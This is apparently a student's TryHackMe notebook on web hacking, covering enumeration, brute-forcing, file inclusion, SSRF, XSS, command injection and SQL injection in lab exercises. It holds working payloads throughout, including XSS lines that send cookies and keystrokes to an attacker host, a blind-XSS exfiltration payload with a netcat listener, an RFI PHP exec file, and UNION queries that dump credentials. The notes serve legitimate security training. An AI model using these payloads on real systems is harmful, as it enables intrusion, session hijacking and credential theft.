# Penetration Testing Notes

# Try Hack Me

# Intro to Web Hacking

- [Penetration Testing Notes](#penetration-testing-notes)
- [Try Hack Me](#try-hack-me)
- [Intro to Web Hacking](#intro-to-web-hacking)
  - [Walking an Application](#walking-an-application)
  - [Content Discovery](#content-discovery)
    - [Manual Discovery - Robots.txt](#manual-discovery---robotstxt)
    - [Manual Discovery - Favicon](#manual-discovery---favicon)
    - [Manual Discovery - Sitemap.xml](#manual-discovery---sitemapxml)
    - [Manual Discovery - HTTP Headers](#manual-discovery---http-headers)
    - [Manual Discovery - Framework Stack](#manual-discovery---framework-stack)
    - [OSINT - Google Hacking / Dorking](#osint---google-hacking--dorking)
    - [OSINT - Wappalyzer](#osint---wappalyzer)
    - [OSINT - Wayback Machine](#osint---wayback-machine)
    - [OSINT - Github](#osint---github)
    - [OSINT - S3 Buckets](#osint---s3-buckets)
    - [Automated Discovery](#automated-discovery)
      - [Tools](#tools)
  - [Subdomain Enumeration](#subdomain-enumeration)
    - [OSINT - SSL/TLS Certificates](#osint---ssltls-certificates)
    - [OSINT - Search Engines](#osint---search-engines)
    - [DNS Bruteforce](#dns-bruteforce)
    - [OSINT Sublist3r](#osint-sublist3r)
    - [Virtual Hosts](#virtual-hosts)
    - [Authentication Bypass](#authentication-bypass)
    - [Brute Force](#brute-force)
    - [Logic Flaw](#logic-flaw)
  - [Cookie Tampering](#cookie-tampering)
    - [Hash cracking](#hash-cracking)
  - [IDOR](#idor)
    - [Encoding](#encoding)
    - [Hashing](#hashing)
    - [Unpredicatble IDs](#unpredicatble-ids)
    - [Where IDORs are located?](#where-idors-are-located)
    - [Practical IDOR example](#practical-idor-example)
  - [File Inclusion](#file-inclusion)
    - [Lab 1 - Local File Inclusion](#lab-1---local-file-inclusion)
  - [Remote File Inclusion - RFI](#remote-file-inclusion---rfi)
  - [Chalenges](#chalenges)
    - [Challenge 1](#challenge-1)
    - [Challenge 2](#challenge-2)
    - [Challenge 3](#challenge-3)
  - [Intro to SSRF](#intro-to-ssrf)
    - [SSRF Examples](#ssrf-examples)
    - [Finding an SSRF](#finding-an-ssrf)
    - [Defeating Common SSRF Defenses](#defeating-common-ssrf-defenses)
      - [Deny List](#deny-list)
      - [Allow List](#allow-list)
      - [Open Redirect](#open-redirect)
    - [SSRF Practical](#ssrf-practical)
  - [Intro to Cross-site Scripting](#intro-to-cross-site-scripting)
    - [Proof of Concepts](#proof-of-concepts)
    - [Reflected XSS](#reflected-xss)
    - [Stored XSS](#stored-xss)
    - [DOM Based XSS](#dom-based-xss)
    - [Blind XSS](#blind-xss)
    - [Perfecting your payload](#perfecting-your-payload)
      - [Level 1](#level-1)
      - [Level 2](#level-2)
      - [Level 3](#level-3)
      - [Level 4](#level-4)
      - [Level 5](#level-5)
      - [Level 6](#level-6)
      - [Polygots](#polygots)
    - [Practical Example (Blind XSS)](#practical-example-blind-xss)
  - [Command Injection](#command-injection)
    - [Discovering Command Injection](#discovering-command-injection)
    - [Exploiting Command Injection](#exploiting-command-injection)
    - [Remediating Command Injection](#remediating-command-injection)
      - [Command Injection Cheat Sheet](#command-injection-cheat-sheet)
      - [Practical - Command Injection](#practical---command-injection)
  - [SQL Injection](#sql-injection)
    - [What is SQL](#what-is-sql)
    - [What is SQL Injection](#what-is-sql-injection)
    - [In-Band SQLi](#in-band-sqli)
      - [Practical](#practical)
        - [In-Band SQLi](#in-band-sqli-1)
        - [Blind SQLi - Authentication Bypass](#blind-sqli---authentication-bypass)
      - [Boolean Based SQLi](#boolean-based-sqli)
      - [Blind SQLi - Time Based](#blind-sqli---time-based)
      - [Out-of-Band SQLi](#out-of-band-sqli)
  - [OWASP Juice Shop](#owasp-juice-shop)
    - [Open for business!](#open-for-business)
    - [Lets go on an adventure!](#lets-go-on-an-adventure)
    - [Inject the Juice](#inject-the-juice)
    - [Who broke my lock?](#who-broke-my-lock)
    - [AH! Dont' Look](#ah-dont-look)
    - [Who's flying this thing](#whos-flying-this-thing)
      - [Question 1 - Access the Administrators Page](#question-1---access-the-administrators-page)
      - [Question 2 - View another user's shopping basket](#question-2---view-another-users-shopping-basket)
      - [Question 3 - Remove all 5 star reviews](#question-3---remove-all-5-star-reviews)
    - [Where did that come from?](#where-did-that-come-from)
      - [Question 1 - Perform a DOM XSS](#question-1---perform-a-dom-xss)
      - [Question 2 - Perform a persistent XSS](#question-2---perform-a-persistent-xss)
      - [Question 3 - Perform a reflected XSS](#question-3---perform-a-reflected-xss)
    - [Access the /#/score-board/page](#access-the-score-boardpage)
  - [Upload Vulnerabilities](#upload-vulnerabilities)
    - [Intro](#intro)
    - [General Methodology](#general-methodology)
    - [Overwriting Existing Files](#overwriting-existing-files)
    - [Remote Code Execution](#remote-code-execution)
      - [Web Shells](#web-shells)
    - [Filtering](#filtering)
      - [Types of Filtering](#types-of-filtering)
    - [Bypassing Client-Side Filtering](#bypassing-client-side-filtering)
      - [Client Side Bypass](#client-side-bypass)
        - [Practical](#practical-1)
    - [Bypassing Server-Side Filtering: File Extensions](#bypassing-server-side-filtering-file-extensions)
      - [Practical](#practical-2)
    - [Bypassing Server-Side Filtering: Magic Numbers](#bypassing-server-side-filtering-magic-numbers)
      - [Practical](#practical-3)
    - [Example Methodology](#example-methodology)
    - [Practical](#practical-4)


## Walking an Application

HTML Comments 

<!-- This is an example comment-->

Look for where things are stored. Attempt to explore directories where files or images are stored.

Check page source to attempt to identify if the site is using a common framework and try to identify version and if any vulnerabilities are present. 

**Developer Tools - Inspect**

Inspect elements to be able to edit things like CSS styles. In this lab you can edit the CSS style block to none to remove the payall

**Developer Tools - Debugger**
Called Sources in Google Chrome

Clicking {} at the bottom of the debugger enable pretty print and makes the javascript more readable. 

If you click the line number you insert a break point, this tells the website to stop before this line of code. 

In this lab if you insert the breakpoint

**Developer Tools -Network**

Keeps track of every external web request. Check the requests and their responses.

## Content Discovery

Manual, Automated, and OSINT

### Manual Discovery - Robots.txt

Viewing the robots.txt can show you which parts of the site are not indexed by search engines. 

Example: 

Disallow: /staff-portal

### Manual Discovery - Favicon

Can be used to identify framework used if not updated by developer

OWASP has a database of favicon icons to identify - https://wiki.owasp.org/index.php/OWASP_favicon_database

This uses md5 hashes to identify the framework used

Use curl "FAVICON ADDRESS" | md5sum to get the hash. Search on OWASP database to identify framework.

### Manual Discovery - Sitemap.xml

Lists every file website owner wants listed in search engines.

Check sitemap for areas of the website that may not be publically available or suspicious, curious areas.

### Manual Discovery - HTTP Headers

Headers can sometimes include useful information, webserver software/programming language used. Can be used to find vulnerable versions.

Run curl "SITE ADDRESS" -v

### Manual Discovery - Framework Stack

Either by comments in the page source or by the favicon, once the framework is discovered that can be used to find ways to exploit. In this lab the method was to review the documentaiton for the administrator login page and test default credentials that hadn't been changed. 

### OSINT - Google Hacking / Dorking

**Examples**

site
	site:tryhackme.com
	returns results only from the specified website address
inurl
	inurl:admin
	returns results that have the specified word in the URL
filetype
	filetype:pdf
	returns results which are a particular file extension
intitle
	intitle:admin
	returns results that contain the specified word in the title

### OSINT - Wappalyzer

Online tool and browser extension to identify what technologies a website uses, such as frameworks CMS and more. 

### OSINT - Wayback Machine

Utilize this to discover old pages that may still be active on the website. 

### OSINT - Github

Search for repo's for companies you are targeting. See what information you can uncover, passwords, source code, etc. 

### OSINT - S3 Buckets

S3 buckets can be discovered in many ways, such as finding the URLs in the website's page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as {name}-assets, {name}-www, {name}-public, {name}-private, etc.

### Automated Discovery

Worlists. 

#### Tools

These tools can be used to automate discovery. You can import common wordlists and scan websites for directories or files that exist in the wordlists. See the tools below:

**ffuf**
  
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.77.145/FUZZ    

**dirb**
          
dirb http://10.10.77.145/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt  
      
**Gobuster**
           
gobuster dir --url http://10.10.77.145/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

## Subdomain Enumeration

Methods: Brute Force, OSINT (Open-Source Intelligence) and Virtual Host

### OSINT - SSL/TLS Certificates

Certificate Transparency Logs - Public logs of every SSL/TLS certificate created for domain name. 

Use to advantage to discover subdomains belonging to domain. Sites like https://crt.sh and https://ui.ctsearch.entrust.com/ui/ctsearchui 

### OSINT - Search Engines

Google dorking - discover subdomains

site:*tryhackme.com

### DNS Bruteforce

Try a large number of different possibilities from a pre-defined list of commonly used subdomains. Automated with tools. DNSrecon request

### OSINT Sublist3r

Automated discovery using Sublist3r.

### Virtual Hosts

Tools like ffuf can be used to automate subdomain disovery for virtual hosts. Need to eliminate false positives, run command and identify most common size of request and filter out.

Examples:

ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.94.145

Most common size from this request was 2395

ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.94.145 -fs 2395

Discovered two positive results after filtering out false positives.

### Authentication Bypass

Ways website authentication methods can be bypassed

Creating a list of valid usernames. You can use account registration pages to try common account names, errors can reveal that an account with that name already exists. 

admin

ffuf can be used to automate and build a list of valid usernames by using a wordlist. 

ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.197.96/customers/signup -mr "username already exists"

-w selects the wordlist
-x specifies request method, GET is default. When filling the form this is a POST request
-d specifies the data you send we have the fields username, email, password and cpassword.
-H adds addaitonal header sto request, this case setting Content-Type so the web server knows we are sending form data.
-mr uses regex to identify the text on the page used to validate a valid username

admin, robert, steve, simon

### Brute Force

Brute forcing w/ fuff, using the valid_usernames.txt file that we created with the valid usernames enumerated in the prior step

ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.197.96/customers/login -fc 200

W1 is the first keyword used to insert the valid username
W2 is the list of passwords
-w argument is used and word lists are separated with a comma

-fc argument is used to check for an HTTP status code other than 200

302 was the status when a username was found

steve/thunder

### Logic Flaw

When a typical logical path of an application is bypassed, circumvented or manipulated by a hacker. 

Exploit reset password function on test site

## Cookie Tampering

curl http://10.10.165.162/cookie-test
- Returns not logged in

curl -H "Cookie: logged_in=true; admin=false" http://10.10.165.162/cookie-test

- The -H flag adds teh coockie header that we manipulated
- Receives message stating Logged in As A User

### Hash cracking

crackstation.net

## IDOR

Insecure Direct Objec Reference - type of access control vulnerability

### Encoding

base64 is often used to encode web data. You can decode, manipulate, and encode. Often end in a =

### Hashing

Things can also be hashed, when a hash is discovered its worthy runing through crackstation.net to see if they have the cracked hash

### Unpredicatble IDs 

If you cant decode or crack the hash of a user id for example you can create a test account and attempt to swap the id of the test account with the true account. If you can view the toehrs content you found an IDOR. 

### Where IDORs are located?

Might be in an AJAX request or something referenced in a Javascript file. 

### Practical IDOR example

Check get request for items like userids, try to manipulate ids to get information such as account names and emails. 

This could be used to enhance a brute force attack or password spraying attack.

## File Inclusion

Local File Inclusion, Remote File Inclusion, and directory traversal.

### Lab 1 - Local File Inclusion

PHP functions such as include, require, include_once, and require_once contribute to vulnerable we applications. 

http://10.10.215.91/lab2.php?file=test.php

This request can be manipulated. Test the ../ vulnerability, try to get things like /etc/passwd or moving around directories

Null bytes can be used to bypass input that has defined input at the end. Tricks web applications into discarding everything after the null byte. 

**%00** or **0x00** in hex

PHP was used in this lab along with the file_get_contents and includes function. 

Sending invalid data was used to reveal error codes that showed how the data was being processed. 

../../../../etc/passwd could be used as a payload, an example of directory traversal. 

Sometimes the app would apply .php to the end of any input the null byte was used to bypass this, make sure to try in request bar or developer tools

Pay attention to how the data is being passed, it was filtered in some instances, doubleing things could bypass a filter for example ../ could be filtered and removed, in this case ....// was used as the initial ../ was stripped out. 

## Remote File Inclusion - RFI

Allows an attacker to inject external URL into include function. One requirement for RFI is that the allow_url_fopen needs to be on. Allows RCE


## Chalenges

### Challenge 1

Capture Flag1 at /etc/flag1

The input form is broken so we have to use manual curl requests

curl -x POST [options] [URL] - curl request format

The challenge tells us that the form is broken and we need to send a curl request with the 'file' parameter.

- Researched how to send CURL requests
- Sent a test curl request
  - curl -X POST -d 'file=test.php' http://10.10.221.7/challenges/chall1.php
    - Got a response from the server, showed the PHP include function
- Sent a 2nd curl request attempting to traverse directories to /etc/flag1
  - curl -X POST -d 'file=../../../../etc/flag1' http://10.10.221.7/challenges/chall1.php
    - flag was `F1x3d-iNpu7-f0rrn`

### Challenge 2

Capture the Flag2 at /etc/flag2

- Sending the same curl request but with flag 2 results in the webiste saying flag 2 is not allowed
  - Attempted to bypass filtering, didnt change anything, just got an error. Likely not a filter
  - Hint in try hack me says to check cookies
  - Changed cookie Name: THM value to Admin, received a Welcome Admin message, manually using dev tools
    - I had to look this one up. 
  - When dealing with pages that are authenticated it is important to check the cookie. The cookie can also be used to perform directory traversal
    - Change cookie value to ../../../../etc/flag2 and you will notice it is adding .php
    - Use the null byte %00 and send ../../../etc/flag2%00 and you will get the flag

### Challenge 3

Gain RCE in /playground.txt

- Researhced PHP RCE utilizing a remote file inclusion. 
- Create a malicious PHP file the exectues a function, in this case the hostname function which was the flag. 
- PHP code: `<?php exec('hostname', $output); echo $output[0]; ?>`
- At first I tried to install apache and run a webserver to host the file on the attack box, it failed for some reason. I researched and learned that python3 has a built in http module that can host a simple web server. 
  - Created cmd.txt with the malicious php code
  - Ran the python webserver
  - Navigated to playground.php page
  - For file name, gave: `http://10.10.14.78:8000/cmd.txt`
  - When pressing the include the hostname of the webserver, remote webserver ran the malicious code and the hostname `http://10.10.14.78:8000/cmd.txt` was returned. 

## Intro to SSRF

- Regular SSRF, data is returned to the users screen.
- Blind SSRF, SSRF occurs but no information is returned to the attackers screen

SSRF can result in the following

- Access to unauthorised areas
- Access to customer/org data
- Ability to scale internal networks
- Reveal authentication tokens/credentials

### SSRF Examples

Challenge - Change the address in the browser below to force the webserver to request https://server.website.thm/flag?id=9

`https://website.thm/item/2?server=server.website.thm/flag?id=9&x=`

The server requests https://server.website.thm/flag?id=9&x=.website.thm/api/item?id=2

The `&x=` at the end of the payload makes the webserver ignore the `.website.thm/api/item?id=2` at the end of the request

- Flag = THM{SSRF_MASTER}

### Finding an SSRF

Spotted in a variety of ways

1. When a full URL is used in a parameter in the address bar
   ![alt text](image.png)
2. Hidden in a form field
   ![alt text](image-1.png)
3. Partial URL such as just the hostname
   ![alt text](image-2.png)
4. Or only the path of the URL
   ![alt text](image-3.png)

If working with blind SSRF where no output is reflected back to you you'll need to use an external HTTP logging tool to monitor request such as requestbin.com, your own HTTP server, or Burp Suites Collaborator client

### Defeating Common SSRF Defenses

#### Deny List
- All requests are accepted apart from resources specified in a list or matching a particular pattern.
  - Localhost may be restrpicted, you can use alternative localhost references to bypass, or a subdomain that has a DNS record that resolves to localhost
  - In cloud environments block acces to IP 169.254.169.254, contains metadata for the deployed cloud server with possibly sensitive information

#### Allow List
- All requets get denied unless on a list or match a particular pattern. 

#### Open Redirect
- Feature can be misused by attackers, especially when combined with another security issue like SSRF (Server-Side Request Forgery). SSRF typically lets an attacker trick the server into making requests to unintended locations. Suppose the server is only supposed to allow requests to its own domain (like https://website.thm/). An attacker could exploit the open redirect feature to bypass this restriction and redirect the server to a different, possibly malicious, domain. This makes open redirects a potential security risk if not properly handled.

### SSRF Practical

## Intro to Cross-site Scripting

Payload - JavaScript code to be executed on the targets computer. Intention and Modification

Intention is what you wish the javascript to do, modification is changes to the code to make it execute as we want

### Proof of Concepts

**Simple Payload** - `<script>alert('XSS');</script>`

**Session Stealing** - `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
- Steals details of a users session, login tokens, in cookies on targets machine
- Script steals cookie, base64 encodes the cookie, posts to website under hackers control. Can take over cookies and the targets session. 

**Key Logger** - `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
- Acts as a keylogger

**Business Logic** - `<script>user.changeEmail('attacker@hacker.thm');</script>`

### Reflected XSS
Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

**How to test for Reflected XSS:**

You'll need to test every possible point of entry; these include:

    Parameters in the URL Query String
    URL File Path
    Sometimes HTTP Headers (although unlikely exploitable in practice)

Attacker has to craft a malicious link that includes XSS, then distribute that to victims. 

Then when the victim uses the malicious link the code is ran that can be used by the attacker

### Stored XSS

As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

How to test for Stored XSS:

You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:

    Comments on a blog
    User profile information
    Website Listings

### DOM Based XSS

Document Object Model

DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.

    innerHTML and outerHTML:
        These properties allow JavaScript to write HTML content directly to an element. If user-controlled input is unsanitized and used with innerHTML or outerHTML, it can lead to the execution of malicious scripts.

    document.write and document.writeln:
        These methods write directly to the HTML document and can execute script tags if the input is not properly sanitized. These are especially risky when used with data that comes directly from URL parameters or other user inputs.

    eval():
        The eval() function evaluates a string as JavaScript code. If this function is used with strings that include user-controlled input, it can lead to arbitrary code execution.

    setTimeout() and setInterval():
        These timing functions can evaluate strings as code, similar to eval(). If user input constructs the string, it can lead to XSS.

    Function constructor:
        Similar to eval(), the Function constructor can create new function instances from strings containing JavaScript code. If these strings are tainted by user input, it could lead to XSS.

    innerHTML vs. textContent:
        While textContent properly escapes HTML tags and is considered safe for inserting text, innerHTML does not, which makes it a target for injecting executable HTML/JavaScript.

    URL manipulation:
        Methods like location.href, location.search, location.hash, and URLSearchParams can be used to manipulate or retrieve the URL. If these are improperly used or unsanitized, they can be exploited to alter the document content or execute JavaScript.

    setAttribute:
        This method can be used to set attributes of HTML elements. If attributes like href, src, or event handlers (onclick, onload, etc.) are set using user input without proper sanitization, it can lead to XSS.

    jQuery methods:
        jQuery library methods such as .html(), .append(), .prepend(), and others that modify the DOM can also lead to XSS if they're used with unsanitized user input.

### Blind XSS

Blind XSS is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.

A popular tool for Blind XSS attacks is XSS Hunter Express. Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.

### Perfecting your payload

#### Level 1
Test Payload to Generate Alert - `<script>alert('THM');</script>`

Works because payload is reflected in the html

#### Level 2

Test payload above doesn't work because its in a value attribute, the `<input value=PAYLOAD>`

Need to escape the input value

`"><script>alert('THM');</script>` - `">` closes the value parameter and then closes the input tab

#### Level 3

The input value this time gets reflected inside and HTML tag, this time a textarea tag. Still have to escape the tag, just a little differently. `</textarea><script>alert('THM');</script>`

#### Level 4

You'll have to escape the existing JavaScript command, so you're able to run your code; you can do this with the following payload ';alert('THM');//  which you'll see from the below screenshot will execute your code. The ' closes the field specifying the name, then ; signifies the end of the current command, and the // at the end makes anything after it a comment rather than executable code.

`';alert('THM');//`

#### Level 5

Strips the word script from the user input, to bypass this we can use a payload like this:

`<sscriptcript>alert('THM');</sscriptcript>`

#### Level 6

Enter an image path. When trying the payload `"><script>alert('THM');</script>` the <> characters get filtered out, for this case we can use the additonal attributed of the IMG tag. Onload event. Change the payload to this:

`/images/cat.jpg" onload="alert('THM');`

#### Polygots

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully. 

``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e``

### Practical Example (Blind XSS)

Creating a support ticket and the text of the ticket when entered and created ist stored in a <textarea> tag, we can try to escape that with the following payload: `</textarea>test` which works. We then can try to run some javascript with this payload `</textarea><script>alert('THM');</script>`, which also works. We get an alert from the payload. 

We can use this as a support person would likely end up vieweing the ticket. To capture their cookies and elevate privileges we can use XSS to hijack their logn session. 

1. Set up a listening server using netcat - `nc -nlvp 9001`
   1. If we want to listen on port 9001, we issue the command nc -l -p 9001. The -l option indicates that we want to use Netcat in listen mode, while the -p option is used to specify the port number. To avoid the resolution of hostnames via DNS, we can add -n; moreover, to discover any errors, running Netcat in verbose mode by adding the -v option is recommended. The final command becomes nc -n -l -v -p 9001, equivalent to nc -nlvp 9001
2. Now that the lisening server is up we need to build the payload. 
   1. `</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>`
   2. Let’s break down the payload:
    The </textarea> tag closes the text area field.
    The <script> tag opens an area for us to write JavaScript.
    The fetch() command makes an HTTP request.
    URL_OR_IP is either the THM request catcher URL, your IP address from the THM AttackBox, or your IP address on the THM VPN Network.
    PORT_NUMBER is the port number you are using to listen for connections on the AttackBox.
    ?cookie= is the query string containing the victim’s cookies.
    btoa() command base64 encodes the victim’s cookies.
    document.cookie accesses the victim’s cookies for the Acme IT Support Website.
    </script>closes the JavaScript code block.

The users cookies will eventually come through on the listener. It will be base64 encoded and need to be decoded. Decode the information to reveal the value of the staff-session cookie.

cookie value = 4AB305E55955197693F01D6F8FD2D321

## Command Injection

### Discovering Command Injection

Improper code in any language that runs commands on the underlying server can be used to execute commands not intended by the application

### Exploiting Command Injection

Can determine by the behaviors of an application. 

Shell operators `;`, `&` and `&&` will combine two or more system commands and execute them both. 

Command injection can be done in mostly one of two ways
1. Blind command injection
   1. This type of injection is where there is no direct output from the application when testing payloads. You will have to investigate the behaviours of the application to determine whether or not your payload was successful.
2. Verbose command injection
   1. This type of injection is where there is direct feedback from the application once you have tested a payload. For example, running the `whoami` command to see what user the application is running under. The web application will output the username on the page directly.

**Detecting Blind Command Injection**

Blind command injection is when command injection occurs; however, there is no output visible.

1. Use payloads that cause some time delay, such as `ping` and `sleep`. With these the application will hang based on how many pings or how long you told it to sleep. 
2. Force some output with redirection operators such as `>`. Then you can `cat` to read the output
3. Commands differ between windows and linux so testing is required.
4. `curl` is another way to test for command injection. Can be used to deliver data to and from an application in your payload.
   1. `curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami` - Simple curl payload to an application for command injection. 

**Detecting Verbose Command Injection**

Easiest method of the two. Application gives feedback or output as to what is happening or being executed. 
1. `ping` or `whoami` is directly displayed on the web application

**Useful payloads**

**Linux**
1. whoami - See what user the application is running under.
2. ls - 	List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things.
3. ping - This command will invoke the application to hang. This will be useful in testing an application for blind command injection.
4. sleep - This is another useful payload in testing an application for blind command injection, where the machine does not have `ping` installed.
5. nc - Netcat can be used to spawn a reverse shell onto the vulnerable application. You can use this foothold to navigate around the target machine for other services, files, or potential means of escalating privileges.

**Windows**
1. whoami - See what user the application is running under.
2. dir - 	List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things.
3. ping - This command will invoke the application to hang. This will be useful in testing an application for blind command injection.
4. timeout - This command will also invoke the application to hang. It is also useful for testing an application for blind command injection if the `ping` command is not installed.

### Remediating Command Injection

Command injection can be prevented in a variety of ways. Everything from minimal use of potentially dangerous functions or libraries in a programming language to filtering input without relying on a user’s input.

**Vulnerable Functions**
PHP
- Exec
- Passthru
- System

![alt text](image-4.png)

    The application will only accept a specific pattern of characters (the digits  0-9)
    The application will then only proceed to execute this data which is all numerical.

**Input Sanitization**

Sanitising any input from a user that an application uses is a great way to prevent command injection.

`filter_input` php function is used to check and ensure only numbers are entered. If not its considered invalid.

![alt text](image-5.png)

**Bypassing Filters**

Applications will employ numerous techniques in filtering and sanitising data that is taken from a  user's input. These filters will restrict you to specific payloads; however, we can abuse the logic behind an application to bypass these filters. For example, an application may strip out quotation marks; we can instead use the hexadecimal value of this to achieve the same result.

When executed, although the data given will be in a different format than what is expected, it can still be interpreted and will have the same result.

![alt text](image-6.png)
#### Command Injection Cheat Sheet

https://github.com/payloadbox/command-injection-payload-list

#### Practical - Command Injection

What user is this application running as?
  127.0.0.1 ; whoami - www-data
What are the contents of the flag located in /home/tryhackme/flag.txt?
  127.0.0.1 ; cat /home/tryhackme/flag.txt - THM{COMMAND_INJECTION_COMPLETE}

Web application pings an IP entered by the user by default. If you just try to enter a command it will not return any output. We need to use shell operators to string commands together. 

## SQL Injection

### What is SQL

**SELECT**

`select * from users;` - Retrieves all columns from the users table
`select username,password from users;` - Retrieves usersname and password fields
`select * from users LIMIT 1;` - LIMIT 1 forces the DB to return only wone row of data. Chaing to LIMIT 1,1 skips the first row, LIMIT 2,1 skips the first two and so forth. 
`select * from users where username='admin';` - where lets us pick exact data by returning matches
`select * from users where username != 'admin';` - not admin
`select * from users where username='admin' or username='jon';` - admin or jon
`select * from users where username='admin' and password='p4ssword';` - username is password and password is p4ssword
`select * from users where username like 'a%';` - like clauses specify data that isn't an exact match but starts, contains, ends with certain characters. Use `%` as a wild card. Query above returns a username beginnin with letter a
`select * from users where username like '%n';` - username ending with letter n
`select * from users where username like '%mi%';` - containing mi characters

**UNION**

Combines resultes of two or more select statements to retrieve data from either single or multiple tables. Must retrieve same number of columns in each SELECT statement, similar data type, and column order has to be the same.

![alt text](image-7.png)

`SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;`

![alt text](image-8.png)

**INSERT**
The INSERT statement tells the database we wish to insert a new row of data into the table. 
`insert into users (username,password) values ('bob','password123');`
**UPDATE**
The UPDATE statement tells the database we wish to update one or more rows of data within a table. You specify the table you wish to update using "update %tablename% SET" and then select the field or fields you wish to update as a comma-separated list such as "username='root',password='pass123'" then finally, similar to the SELECT statement, you can specify exactly which rows to update using the where clause such as "where username='admin;".

`update users SET username='root',password='pass123' where username='admin';`

**DELETE**

The DELETE statement tells the database we wish to delete one or more rows of data. Apart from missing the columns you wish to return, the format of this query is very similar to the SELECT. You can specify precisely which data to delete using the where clause and the number of rows to be deleted using the LIMIT clause.

`delete from users where username='martin';`

`delete from users;` - delets everything in users table.

### What is SQL Injection

The point wherein a web application using SQL can turn into SQL Injection is when user-provided data gets included in the SQL query.

A web URL that looks like this `https://website.thm/blog?id=1` may be runing a query to retrive the blog by ID. Query could look like `SELECT * from blog where id=1 and private=0 LIMIT 1;`

![alt text](image-9.png)

### In-Band SQLi

**In-Band SQL Injection**

In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.

**Error-Based SQL Injection**

This type of SQL Injection is the most useful for easily obtaining information about the database structure, as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 

**Union-Based SQL Injection**

This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

#### Practical

##### In-Band SQLi

The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( ' ) or a quotation mark ( " ).

https://website.thm/article?id=1 - is the URL we are testing

`https://website.thm/article?id=1 UNION SELECT 1,2` produces error
`1 UNION SELECT 1,2,3` returns the article
`0 UNION SELECT 1,2,3` returns no results
`0 UNION SELECT 1,2,database()` returns name of the database
`0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`- There are a couple of new things to learn in this query. Firstly, the method group_concat() gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas. The next thing is the information_schema database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users. 
`0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'` - This is similar to the previous SQL query. However, the information we want to retrieve has changed from table_name to column_name, the table we are querying in the information_schema database has changed from tables to columns, and we're searching for any rows where the table_name column has a value of staff_users.


The query results provide three columns for the staff_users table: id, password, and username. We can use the username and password columns for our following query to retrieve the user's information.

`0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`

**flag**
THM{SQL_INJECTION_3840}

##### Blind SQLi - Authentication Bypass

Level Two of the SQL Injection examples shows this exact example. We can see in the box labelled "SQL Query" that the query to the database is the following: `select * from users where username='%username%' and password='%password%' LIMIT 1;`

Login forms that are connected to a database of users are often developed in such a way that the web application isn't interested in the content of the username and password but more in whether the two make a matching pair in the users table. In basic terms, the web application is asking the database, "Do you have a user with the username bob and the password bob123?" the database replies with either yes or no (true/false) and, depending on that answer, dictates whether the web application lets you proceed or not. 

To make this into a query that always returns as true, we can enter the following into the password field: `' OR 1=1;--`

Which turns the SQL query into the following: `select * from users where username='' and password='' OR 1=1;`

Because 1=1 is a true statement and we've used an OR operator, this will always cause the query to return as true, which satisfies the web applications logic that the database found a valid username/password combination and that access should be allowed.

#### Boolean Based SQLi

1. Determine number of columns in the users table
   1. `admin123' UNION SELECT 1;-- `
      1. Returns taken false
   2. `admin123' UNION SELECT 1,2,3;-- `
      1. Returns taken true, which means we got the number of columns correct
2. Enumerate the database
   1. `admin123' UNION SELECT 1,2,3 where database() like '%';--`
      1. Returns true response because of `%` wildcard
   2. `admin123' UNION SELECT 1,2,3 where database() like 'a%';--`
      1. Returns false because database name does not start with a
